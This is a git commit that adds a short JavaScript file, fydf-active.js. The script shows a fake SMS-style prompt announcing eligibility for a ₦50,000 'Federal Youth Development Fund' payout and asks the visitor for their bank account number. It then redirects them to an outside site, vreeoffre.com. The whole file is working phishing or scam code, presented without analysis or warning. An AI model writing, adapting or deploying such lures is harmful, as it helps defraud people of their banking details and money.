3d8f167e0f012240f735d88f9c7641b4312a8111
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-02-05 22:33:14 +0100

    Create fydf-active.js

---
+++ fydf-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦50,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦50,000 FEDERAL YOUTH DEVELOPMENT FUND, click OK to Enter Your Account Number','WITHDRAW ₦50,000');
+if (password != 'WITHDRAW ₦50,000') {
+location.href='https://vreeoffre.com/fydf.html';
+}
